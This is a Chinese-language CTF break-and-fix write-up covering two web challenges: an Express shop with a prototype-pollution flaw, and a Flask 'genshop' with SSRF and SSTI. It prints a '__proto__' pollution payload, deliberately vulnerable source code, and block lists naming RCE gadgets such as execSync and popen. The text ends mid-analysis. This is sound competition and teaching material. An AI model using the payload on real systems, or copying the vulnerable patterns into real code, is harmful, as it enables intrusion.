<p>读一下源码</p>
<pre><code class="highlight js"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);
<span class="keyword">const</span> app = <span class="title function_">express</span>();
<span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);
<span class="keyword">const</span> port = <span class="number">3000</span>;
<span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);

app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);
app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>));
app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));

<span class="keyword">let</span> money = <span class="number">1000</span>;
<span class="keyword">const</span> initialMoney = <span class="number">1000</span>;
<span class="keyword">let</span> message = <span class="string">&#x27;&#x27;</span>;
<span class="keyword">const</span> products = [
  &#123; <span class="attr">name</span>: <span class="string">&#x27;帽子&#x27;</span>, <span class="attr">price</span>: <span class="number">10</span> &#125;,
  &#123; <span class="attr">name</span>: <span class="string">&#x27;棒球&#x27;</span>, <span class="attr">price</span>: <span class="number">15</span> &#125;,
  &#123; <span class="attr">name</span>: <span class="string">&#x27;iphone&#x27;</span>, <span class="attr">price</span>: <span class="number">150</span> &#125;,
  &#123; <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="attr">price</span>: <span class="number">1500</span> &#125;,
];

app.<span class="title function_">get</span>(<span class="string">&#x27;/showflag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
  res.<span class="title function_">render</span>(<span class="string">&#x27;readfile&#x27;</span>);
&#125;);

app.<span class="title function_">post</span>(<span class="string">&#x27;/readfile&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
  <span class="keyword">const</span> fileName = req.<span class="property">body</span>.<span class="property">fileName</span>;

  <span class="keyword">if</span> (fileName.<span class="title function_">includes</span>(<span class="string">&quot;fl&quot;</span>)) &#123;
    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;你还真读flag啊&#x27;</span>);
  &#125;
  <span class="comment">// 读取文件内容</span>
  fs.<span class="title function_">readFile</span>(<span class="string">&quot;/app/public/&quot;</span>+fileName, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;
    <span class="keyword">if</span> (err) &#123;
      res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading the file&#x27;</span>);
    &#125; <span class="keyword">else</span> &#123;
      res.<span class="title function_">send</span>(data);
    &#125;
  &#125;);
&#125;);


app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; products, money, message &#125;);
&#125;);

app.<span class="title function_">get</span>(<span class="string">&#x27;/buy/:productIndex&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
  <span class="keyword">const</span> productIndex = req.<span class="property">params</span>.<span class="property">productIndex</span>;
  <span class="keyword">let</span> quantity = req.<span class="property">query</span>.<span class="property">quantity</span> || <span class="number">1</span>; <span class="comment">// 获取购买数量，默认为1</span>

  <span class="keyword">if</span> (productIndex === <span class="string">&#x27;3&#x27;</span>) &#123;
    quantity = <span class="title class_">Math</span>.<span class="title function_">abs</span>(quantity); <span class="comment">// 取绝对值</span>
    <span class="keyword">if</span> (products[productIndex] &amp;&amp; money &gt;= products[productIndex].<span class="property">price</span> * quantity) &#123;
      money -= products[productIndex].<span class="property">price</span> * quantity;
      message = <span class="string">`购买flag成功啦！给你/showflag这个路由，听说那里面有flag`</span>;


      res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; products, money, message, <span class="attr">showAlert</span>: <span class="literal">true</span> &#125;);
    &#125; <span class="keyword">else</span> &#123;
      message = <span class="string">&#x27;flag很贵的&#x27;</span>;
      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);
    &#125;
  &#125;<span class="keyword">else</span>&#123;
    <span class="keyword">if</span> (products[productIndex] &amp;&amp; money &gt;= products[productIndex].<span class="property">price</span> * quantity) &#123;
      money -= products[productIndex].<span class="property">price</span> * quantity;
      message = <span class="string">`成功购买了 <span class="subst">$&#123;quantity&#125;</span> 件 &quot;<span class="subst">$&#123;products[productIndex].name&#125;</span>&quot;！`</span>;

      <span class="comment">// 使用 JavaScript 弹窗来显示购买成功消息</span>
      res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; products, money, message, <span class="attr">showAlert</span>: <span class="literal">true</span> &#125;);
    &#125; <span class="keyword">else</span> &#123;
      message = <span class="string">&#x27;购买失败，钱不够啊老铁.&#x27;</span>;
      res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);
    &#125;
  &#125;
&#125;);



<span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>) &#123;
  <span class="keyword">if</span> (<span class="keyword">typeof</span> object1 !== <span class="string">&#x27;object&#x27;</span> || object1 === <span class="literal">null</span> ||
      <span class="keyword">typeof</span> object2 !== <span class="string">&#x27;object&#x27;</span> || object2 === <span class="literal">null</span>) &#123;
    <span class="keyword">return</span>;
  &#125;

  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;
    <span class="keyword">if</span> (
      <span class="keyword">typeof</span> object2[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp;
      object2[key] !== <span class="literal">null</span> &amp;&amp;
      <span class="keyword">typeof</span> object1[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp;
      object1[key] !== <span class="literal">null</span>
    ) &#123;
      <span class="title function_">copy</span>(object1[key], object2[key]); <span class="comment">// ✅ 安全递归</span>
    &#125; <span class="keyword">else</span> &#123;
      object1[key] = object2[key]; <span class="comment">// ✅ 直接赋值</span>
    &#125;
  &#125;
&#125;


app.<span class="title function_">post</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(), <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;
  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);
  <span class="keyword">const</span> flagFilePath = <span class="string">&#x27;/flag&#x27;</span>;
  <span class="keyword">let</span> flag = <span class="string">&#x27;&#x27;</span>;
  fs.<span class="title function_">readFile</span>(flagFilePath, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;
    <span class="keyword">if</span> (err) &#123;
      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`无法读取文件: <span class="subst">$&#123;flagFilePath&#125;</span>`</span>);
    &#125; <span class="keyword">else</span> &#123;
      flag = data; <span class="comment">// 将文件内容赋值给flag变量</span>
      <span class="keyword">var</span> secert = &#123;&#125;;
      <span class="keyword">var</span> sess = req.<span class="property">session</span>;
      <span class="keyword">let</span> user = &#123;&#125;;
      <span class="title function_">copy</span>(user, req.<span class="property">body</span>);
      <span class="keyword">if</span> (secert.<span class="property">testattack</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;
        res.<span class="title function_">end</span>(flag);

      &#125; <span class="keyword">else</span> &#123;
        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;no,no,no!&quot;</span>);
      &#125;
    &#125;
  &#125;);
&#125;);


app.<span class="title function_">get</span>(<span class="string">&#x27;/reset&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;
  money = initialMoney;
  message = <span class="string">&#x27;&#x27;</span>;
  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);
&#125;);

app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;
  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server is running on http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);
&#125;);</code></pre>
<p>吼吼，原来前面的都没啥用，最主要的在这一块</p>
<pre><code class="highlight js"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>) &#123;
  <span class="keyword">if</span> (<span class="keyword">typeof</span> object1 !== <span class="string">&#x27;object&#x27;</span> || object1 === <span class="literal">null</span> ||
      <span class="keyword">typeof</span> object2 !== <span class="string">&#x27;object&#x27;</span> || object2 === <span class="literal">null</span>) &#123;
    <span class="keyword">return</span>;
  &#125;

  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;
    <span class="keyword">if</span> (
      <span class="keyword">typeof</span> object2[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp;
      object2[key] !== <span class="literal">null</span> &amp;&amp;
      <span class="keyword">typeof</span> object1[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp;
      object1[key] !== <span class="literal">null</span>
    ) &#123;
      <span class="title function_">copy</span>(object1[key], object2[key]); <span class="comment">// ✅ 安全递归</span>
    &#125; <span class="keyword">else</span> &#123;
      object1[key] = object2[key]; <span class="comment">// ✅ 直接赋值</span>
    &#125;
  &#125;
&#125;


app.<span class="title function_">post</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(), <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;
  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);
  <span class="keyword">const</span> flagFilePath = <span class="string">&#x27;/flag&#x27;</span>;
  <span class="keyword">let</span> flag = <span class="string">&#x27;&#x27;</span>;
  fs.<span class="title function_">readFile</span>(flagFilePath, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;
    <span class="keyword">if</span> (err) &#123;
      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`无法读取文件: <span class="subst">$&#123;flagFilePath&#125;</span>`</span>);
    &#125; <span class="keyword">else</span> &#123;
      flag = data; <span class="comment">// 将文件内容赋值给flag变量</span>
      <span class="keyword">var</span> secert = &#123;&#125;;
      <span class="keyword">var</span> sess = req.<span class="property">session</span>;
      <span class="keyword">let</span> user = &#123;&#125;;
      <span class="title function_">copy</span>(user, req.<span class="property">body</span>);
      <span class="keyword">if</span> (secert.<span class="property">testattack</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;
        res.<span class="title function_">end</span>(flag);

      &#125; <span class="keyword">else</span> &#123;
        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;no,no,no!&quot;</span>);
      &#125;
    &#125;
  &#125;);
&#125;);</code></pre>
<p>看到迭代就知道是原型链污染了</p>
<pre><code class="highlight json"><span class="punctuation">&#123;</span>
  <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>
    <span class="attr">&quot;testattack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span>
  <span class="punctuation">&#125;</span>
<span class="punctuation">&#125;</span></code></pre>
<p>这题没fix出来</p>
<pre><code class="highlight plaintext">function copy(object1, object2) &#123;
    if (typeof object1 !== &#x27;object&#x27; || object1 === null ||
        typeof object2 !== &#x27;object&#x27; || object2 === null) &#123;
        return;
    &#125;
    for (let key in object2) &#123;
        if (
            typeof object2[key] === &#x27;object&#x27; &amp;&amp;
            object2[key] !== null &amp;&amp;
            typeof object1[key] === &#x27;object&#x27; &amp;&amp;
            object1[key] !== null
        ) &#123;
            copy(object1[key], object2[key]); // ✅ 安全递归
        &#125; else &#123;
        	//fix
            if (key.includes(&quot;admin&quot;))&#123;
                throw Error(&quot;no&quot;)
            &#125;//fix
            else&#123;
                object1[key] = object2[key]; 
            &#125;
        &#125;
    &#125;
&#125;


app.post(&#x27;/getflag&#x27;, require(&#x27;body-parser&#x27;).json(), function (req, res, next) &#123;
    res.type(&#x27;html&#x27;);
    const flagFilePath = &#x27;/flag&#x27;;
    let flag = &#x27;&#x27;;
    fs.readFile(flagFilePath, &#x27;utf8&#x27;, (err, data) =&gt; &#123;
        if (err) &#123;
            console.error(`无法读取文件: $&#123;flagFilePath&#125;`);
        &#125; else &#123;
            flag = data; // 将文件内容赋值给flag变量
            //fix
            var secert = &#123;&quot;testattack&quot;:&quot;user&quot;&#125;;
            //fix
            var sess = req.session;
            let user = &#123;&#125;;
            copy(user, req.body);
            if (secert.testattack === &#x27;admin&#x27;) &#123;
                res.end(flag);

            &#125; else &#123;
                return res.send(&quot;no,no,no!&quot;);
            &#125;
        &#125;
    &#125;);
&#125;);
</code></pre>
<p>还修了一个整数溢出防止钱反而增加</p>
<p>结果等平台攻击完的日志里都能看到Exception:no还没fix也是闹麻了</p>
<p>这里贴一下其他师傅的fix吧</p>
<pre><code class="highlight plaintext">app.post(&#x27;/readfile&#x27;, (req, res) =&gt; &#123;
  const fileName = req.body.fileName;

  if (fileName.includes(&quot;fl&quot;)) &#123;
    return res.status(200).send(&#x27;你还真读flag啊&#x27;);
  &#125;
  // 阻止读取源码
  if (fileName.includes(&quot;ap&quot;)) &#123;
    return res.status(200).send(&#x27;你还真读app.js啊&#x27;);
  &#125;
  // 读取文件内容
  fs.readFile(&quot;/app/public/&quot;+fileName, &#x27;utf8&#x27;, (err, data) =&gt; &#123;
    if (err) &#123;
      res.status(500).send(&#x27;Error reading the file&#x27;);
    &#125; else &#123;
      res.send(data);
    &#125;
  &#125;);
&#125;);

app.get(&#x27;/buy/:productIndex&#x27;, (req, res) =&gt; &#123;
  const productIndex = req.params.productIndex;
  let quantity = req.query.quantity || 1; // 获取购买数量，默认为1

  if (productIndex === &#x27;3&#x27;) &#123;
    quantity = Math.abs(quantity); // 取绝对值
    if (products[productIndex] &amp;&amp; money &gt;= products[productIndex].price * quantity) &#123;
      money -= products[productIndex].price * quantity;
      message = `购买flag成功啦！给你/showflag这个路由，听说那里面有flag`;

      res.render(&#x27;index&#x27;, &#123; products, money, message, showAlert: true &#125;);
    &#125; else &#123;
      message = &#x27;flag很贵的&#x27;;
      res.redirect(&#x27;/&#x27;);
    &#125;
  &#125;else&#123;
    // 模仿上面对数量做绝对值，防止购买负数增加金钱
    quantity = Math.abs(quantity); // 取绝对值
    if (products[productIndex] &amp;&amp; money &gt;= products[productIndex].price * quantity) &#123;
      money -= products[productIndex].price * quantity;
      message = `成功购买了 $&#123;quantity&#125; 件 &quot;$&#123;products[productIndex].name&#125;&quot;！`;

      // 使用 JavaScript 弹窗来显示购买成功消息
      res.render(&#x27;index&#x27;, &#123; products, money, message, showAlert: true &#125;);
    &#125; else &#123;
      message = &#x27;购买失败，钱不够啊老铁.&#x27;;
      res.redirect(&#x27;/&#x27;);
    &#125;
  &#125;
&#125;);


function copy(object1, object2) &#123;
  if (typeof object1 !== &#x27;object&#x27; || object1 === null ||
      typeof object2 !== &#x27;object&#x27; || object2 === null) &#123;
    return;
  &#125;

  for (let key in object2) &#123;
    // 过滤原型链污染常用字符串
    if (key === &#x27;outputFunctionName&#x27; || key === &#x27;__proto__&#x27; || key === &#x27;constructor&#x27; || key === &#x27;prototype&#x27; || key === &#x27;return&#x27; || key === &#x27;global&#x27; || key === &#x27;process&#x27; || key === &#x27;mainModule&#x27; || key === &#x27;constructor&#x27; || key === &#x27;child&#x27; || key === &#x27;execSync&#x27; || key === &#x27;escapeFunction&#x27; || key === &#x27;client&#x27; || key === &#x27;compileDebug&#x27;) &#123;
      continue;
    &#125;

    if (
      typeof object2[key] === &#x27;object&#x27; &amp;&amp;
      object2[key] !== null &amp;&amp;
      typeof object1[key] === &#x27;object&#x27; &amp;&amp;
      object1[key] !== null
    ) &#123;
      copy(object1[key], object2[key]); // ✅ 安全递归
    &#125; else &#123;
      object1[key] = object2[key]; // ✅ 直接赋值
    &#125;
  &#125;
&#125;</code></pre>
<p>其实感觉把原型链防掉就可以，因为毕竟关键点是在最后的，只是不知道它这个check过的判定到底是什么，实在没懂</p>
<h3 id="genshop"><a class="markdownIt-Anchor" href="#genshop"></a> genshop</h3>
<p>这道是0解题嘻嘻，端口都连不上SSRF拿头做，一直timed out ,不知道是不是我的问题。</p>
<p>hint貌似 是5000端口SSRF+SSTI，中间还有一个hint忘记了</p>
<p>直接贴源码吧</p>
<pre><code class="highlight py"><span class="comment">#/app/app.py</span>
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file
<span class="keyword">import</span> socket

app = Flask(<span class="string">&quot;webserver&quot;</span>)


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">index</span>():
    <span class="keyword">return</span> send_file(__file__)


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/nc&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">nc</span>():
    <span class="keyword">try</span>:
        dstport = <span class="built_in">int</span>(request.form[<span class="string">&#x27;port&#x27;</span>])
        data = request.form[<span class="string">&#x27;data&#x27;</span>]
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(<span class="number">1</span>)
        s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, dstport))
        s.send(data.encode())
        recvdata = <span class="string">b&#x27;&#x27;</span>
        <span class="keyword">while</span> <span class="literal">True</span>:
            chunk = s.recv(<span class="number">2048</span>)
            <span class="keyword">if</span> <span class="keyword">not</span> chunk.strip():
                <span class="keyword">break</span>
            <span class="keyword">else</span>:
                recvdata += chunk
                <span class="keyword">continue</span>
        <span class="keyword">return</span> recvdata
    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
        <span class="keyword">return</span> <span class="built_in">str</span>(e)


app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, threaded=<span class="literal">True</span>)</code></pre>
<pre><code class="highlight py"><span class="comment">#/app/backend/app.py</span>
<span class="keyword">import</span> binascii
<span class="keyword">import</span> os
<span class="keyword">import</span> random
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, session
<span class="keyword">import</span> numpy <span class="keyword">as</span> np
<span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter
<span class="keyword">import</span> uuid


<span class="keyword">def</span> <span class="title function_">get_user</span>() -&gt; <span class="built_in">str</span>:
    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:
        session[<span class="string">&#x27;user_id&#x27;</span>] = uuid.uuid4()
    <span class="keyword">return</span> session[<span class="string">&#x27;user_id&#x27;</span>]


app = Flask(__name__)

app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = binascii.hexlify(os.urandom(<span class="number">24</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)
limiter = Limiter(app=app, key_func=get_user, default_limits=[<span class="string">&#x27;5/minute&#x27;</span>])
letters = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>]


<span class="meta">@app.errorhandler(<span class="params"><span class="number">429</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">handle_exception</span>(<span class="params">e</span>):
    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;h1&gt;How about we access this page later?&lt;/h1&gt;&#x27;</span>)


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">index</span>():
    <span class="keyword">return</span> <span class="string">&quot;Welcome to the genshop&quot;</span>


<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):
    blacklist1 = [<span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>
                  <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;builtin&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>, <span class="string">&#x27;?&#x27;</span>,
                  <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;value&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;base&#x27;</span>]
    <span class="keyword">if</span> <span class="built_in">any</span>(c <span class="keyword">in</span> s <span class="keyword">for</span> c <span class="keyword">in</span> blacklist1):
        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;What are you f* doing, guys?&#x27;</span>)
    blacklist2 = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]
    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist2]) + s


<span class="keyword">def</span> <span class="title function_">stimulate</span>():
    initial_5_star_rate = <span class="number">0.6</span> / <span class="number">100</span>
    total_draws = <span class="number">0</span>
    start_increasing_at = <span class="number">74</span>
    end_increasing_at = <span class="number">91</span>
    current_5_star_rate = initial_5_star_rate
    <span class="keyword">while</span> <span class="literal">True</span>:
        total_draws += <span class="number">1</span>
        <span class="keyword">if</span> total_draws &gt;= start_increasing_at <span class="keyword">and</span> total_draws &lt; end_increasing_at:
            current_5_star_rate += <span class="number">0.06</span>
        <span class="keyword">if</span> random.random() &lt; current_5_star_rate:
            <span class="keyword">break</span>
    <span class="keyword">return</span> total_draws


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">reset</span>():
    session[<span class="string">&#x27;money&#x27;</span>] = <span class="number">0</span>
    session[<span class="string">&#x27;user_id&#x27;</span>] = uuid.uuid4()
    limiter.reset()
    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/gift&#x27;</span></span>)</span>
<span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/hour&quot;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">get_money</span>():
    int_money = <span class="number">0</span>
    <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> request.args:
        <span class="keyword">if</span> <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;money&#x27;</span>)) &lt; <span class="number">80</span>:
            int_money = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;money&#x27;</span>))
        <span class="keyword">else</span>:
            <span class="keyword">return</span> <span class="string">&quot;You are so greedy!&quot;</span>
    session[<span class="string">&#x27;money&#x27;</span>] = (int_money + session[<span class="string">&#x27;money&#x27;</span>]) <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> session.keys() <span class="keyword">else</span> int_money
    <span class="keyword">return</span> <span class="string">f&quot;friend give you <span class="subst">&#123;int_money&#125;</span> money&quot;</span>


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/money&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">query_money</span>():
    <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> session.keys():
        <span class="keyword">return</span> <span class="built_in">str</span>(session.get(<span class="string">&#x27;money&#x27;</span>))
    <span class="keyword">else</span>:
        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span>


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/chest&#x27;</span></span>)</span>
<span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;1/hour&quot;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">get_chest</span>():
    <span class="keyword">if</span> <span class="string">&#x27;money&#x27;</span> <span class="keyword">in</span> session:
        int_money = <span class="built_in">int</span>(session.get(<span class="string">&#x27;money&#x27;</span>))
    <span class="keyword">else</span>:
        int_money = <span class="number">0</span>
    money = int_money
    num = random.randint(<span class="number">0</span>, <span class="number">101</span>)
    <span class="keyword">if</span> num &lt; <span class="number">20</span>:
        money += <span class="number">1</span>
        chest_type = <span class="string">&quot;common&quot;</span>
    <span class="keyword">elif</span> <span class="number">20</span> &lt;= num &lt; <span class="number">60</span>:
        money += <span class="number">2</span>
        chest_type = <span class="string">&quot;exquisite&quot;</span>
    <span class="keyword">elif</span> <span class="number">60</span> &lt;= num &lt; <span class="number">77</span>:
        money += <span class="number">3</span>
        chest_type = <span class="string">&quot;precious&quot;</span>
    <span class="keyword">elif</span> <span class="number">77</span> &lt;= num &lt; <span class="number">99</span>:
        money += <span class="number">4</span>
        chest_type = <span class="string">&quot;remarkable&quot;</span>
    <span class="keyword">else</span>:
        money += <span class="number">5</span>
        chest_type = <span class="string">&quot;shrine&quot;</span>

    session[<span class="string">&#x27;money&#x27;</span>] = money
    <span class="keyword">return</span> <span class="string">f&quot;Congratulations! You found a <span class="subst">&#123;chest_type&#125;</span> chest&quot;</span>


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/genshop&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">get_letter</span>():
    letter = request.form.get(<span class="string">&quot;letter&quot;</span>)
    <span class="keyword">if</span> letter <span class="keyword">is</span> <span class="literal">None</span>:
        <span class="keyword">return</span> <span class="string">&quot;Please choose a letter&quot;</span>
    <span class="keyword">try</span>:
        money = <span class="built_in">int</span>(session.get(<span class="string">&#x27;money&#x27;</span>)) <span class="keyword">or</span> <span class="number">0</span>
    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
        money = <span class="number">0</span>
    money = np.array(money)
    money -= stimulate() * <span class="number">5000</span>
    <span class="keyword">try</span>:
        <span class="keyword">if</span> money &lt; <span class="number">0</span>:
            result = <span class="string">&quot;You don&#x27;t have enough money&quot;</span>
        <span class="keyword">else</span>:
            session[<span class="string">&#x27;money&#x27;</span>] = <span class="number">0</span>
            letter = waf(letter)
            result = <span class="string">&quot;You are not allowed to use this letter&quot;</span>
            <span class="keyword">if</span> letter <span class="keyword">not</span> <span class="keyword">in</span> letters:
                result = <span class="string">f&quot;The <span class="subst">&#123;letter&#125;</span> is not in the genshop&quot;</span>
            <span class="keyword">else</span>:
                result = <span class="string">f&quot;Congratulations! You get the letter: <span class="subst">&#123;letter&#125;</span>&quot;</span>
    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
        result = <span class="built_in">str</span>(e)
    <span class="keyword">return</span> render_template_string(<span class="string">f&quot;&lt;h3&gt;<span class="subst">&#123;result&#125;</span>&lt;/h3&gt;&quot;</span>)


<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
    app.run()
</code></pre>
<h4 id="break-4"><a class="markdownIt-Anchor" href="#break-4"></a> break</h4>
<p>虽说0解</p>
<p>但是可以现在回来再看看呢</p>
<p>先看一下waf在干什么</p>
<pre><code class="highlight py"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):
    blacklist1 = [<span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>
                  <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;builtin&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;sub&#x27;</span>, <span class="string">&#x27;?&#x27;</span>,
                  <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;value&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;base&#x27;</span>]
    <span class="keyword">if</span> <span class="built_in">any</span>(c <span class="keyword">in</span> s <span class="keyword">for</span> c <span class="keyword">in</span> blacklist1):
